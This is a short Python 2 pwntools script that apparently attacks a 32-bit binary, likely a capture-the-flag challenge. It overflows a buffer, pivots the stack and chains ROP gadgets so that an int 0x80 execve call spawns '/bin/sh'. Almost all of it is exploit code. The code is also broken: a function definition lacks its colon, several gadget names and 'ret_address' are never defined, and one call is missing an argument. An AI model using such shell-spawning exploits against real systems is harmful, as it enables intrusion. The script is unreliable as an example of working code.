import sys
from pwn import *

printf=sys.stdout.write;

arg="/bin/sh\x00"
cmd_addr = 0xbfff0000
arg_addr = cmd_addr + 0x6
new_stack_addr = arg_addr + len(arg)
main_eip_addr = 0xbffff70c
main_data_buffer = 0xbffff548

buffer_fill = arg + "A" * (128-len(arg)) + "AAAABBBBCCCC"

ret                     = p32(0x080481b2)
dec_eax_ret             = p32(0x0806483d)
mov_eax_0xc_pop_edi_ret = p32(0x08096f06)
pop_ebx_pop_edi_ret     = p32(0x080bee63)
pop_ecx_pop_ebx_ret     = p32(0x0806f3d1)
pop_edx_ret             = p32(0x0806f3aa)
int_0x80                = p32(0x08048eaa)
pop_edi_ret             = p32(0x0804846f)

# pivot
pivot   = pop_esp + p32(new_stack_addr)

payload = "store\x00"             +\
	  arg                     +\
	  pop_eax + p32(0x0d)     +\
	  pop_ecx + p32(0x00)     +\
	  pop_edx + p32(0x00)     +\
	  pop_ebx + p32(arg_addr) +\
	  int_0x80

def store(data, i)
	print "store"
	print data
	print i

i = -8

store(ret, 1)
i += 1
store(mov_eax_0xc_pop_edi_ret, i)
i += 2
store(dec_eax_ret, i)
i += 1
store(pop_ecx_pop_ebx_ret)
i += 1


print "store\x00" + payload
print ret_address
print "-11"
